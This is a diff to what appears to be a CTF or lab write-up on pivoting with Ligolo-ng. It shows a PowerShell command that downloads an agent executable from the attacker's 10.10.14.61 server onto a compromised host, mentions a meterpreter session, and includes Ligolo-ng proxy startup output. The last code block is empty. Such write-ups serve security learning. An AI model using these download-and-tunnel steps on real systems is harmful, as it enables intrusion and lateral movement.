@@ -267,6 +267,34 @@ Ill start a web server on my machine
 PS C:\Utils> wget http://10.10.14.61/agent.exe -o agent.exe
 ```
 
-Ill drop into a shell from my meterpreter ses
+Ill drop into a shell from my meterpreter session, then download the agent
+
+```python
+❯❯❯ sudo ./proxy -selfcert                                       
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0000] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.2
+
+ligolo-ng »  
+```
+
+Ill then start the proxy on my machine
+
+```python
+
+```
 
 
